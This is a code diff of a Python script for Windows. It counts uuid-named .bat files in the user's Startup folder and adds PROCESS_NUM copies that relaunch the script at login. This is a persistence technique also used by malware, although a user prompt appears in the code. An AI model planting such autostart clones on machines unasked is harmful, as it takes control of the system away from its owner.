@@ -47,7 +47,7 @@ import winreg as reg
 import getpass
 import os
 import zipfile
-
+from os import walk
 USER_NAME = getpass.getuser()
 
 
@@ -187,8 +187,18 @@ if yes == "yes":
 		with open(bat_path + '\\' + str(uuid.uuid4()) + ".bat", "w+") as bat_file:
 			bat_file.write(r'start "" "%s"' % file_path)
 	if(platform.system() == 'windows' or platform.system() == "Windows"):
-		for i in range(PROCESS_NUM):
-			add_to_startup()
+		f = 0
+		pathofclones= r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+		filenames = os.listdir(pathofclones)
+		for i in range(len(filenames)):
+			print(filenames[i].replace(".bat", ""))
+			print("Valid : " + str(valid_uuid(filenames[i].replace(".bat", ""))))
+			if(valid_uuid(filenames[i].replace(".bat", "")) == True):
+				f += 1
+		print("Numbers : " + str(f))
+		if(not f >= PROCESS_NUM):
+			for i in range(PROCESS_NUM):
+				add_to_startup()
 	def checkIfProcessRunning(processName):
 		'''
 		Check if there is any running process that contains the given name processName.
